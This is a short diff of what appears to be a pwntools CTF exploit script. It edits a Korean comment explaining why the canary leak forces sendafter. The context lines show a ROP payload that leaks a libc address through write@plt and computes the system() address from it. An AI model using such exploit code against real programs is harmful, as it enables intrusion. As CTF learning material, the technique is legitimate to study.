@@ -252,8 +252,9 @@ payload += p64(write_plt)
 payload += p64(main)
 
 # p.send(payload)
-# 여기서는 p.send가 안되는 이유가 위에서 canary를 받을 때, recv 뒤에 남은게 read에 저장되버리기 때문에 b'Buf :' 이후에 보내서 받은걸 read에 저장해야 하기
- 때문에 sendafter를 해줘야함
+# 여기서는 p.send가 안되는 이유가 위에서 canary를 받을 때, p.recv(7) 뒤에 남은게 read 변수에서 받을 p.recv(6)에 저장되버리기 때문에,
+# b'Buf :' 이후에 send를 보내서 해당 출력 이후에 받는 recv를 read에 저장해야 하기 때문에 sendafter를 해줘야함
+
 p.sendafter(b'Buf: ', payload)
 read = p.recvn(6) + b'\x00'*0x2
 system = u64(read) - read_system_offset
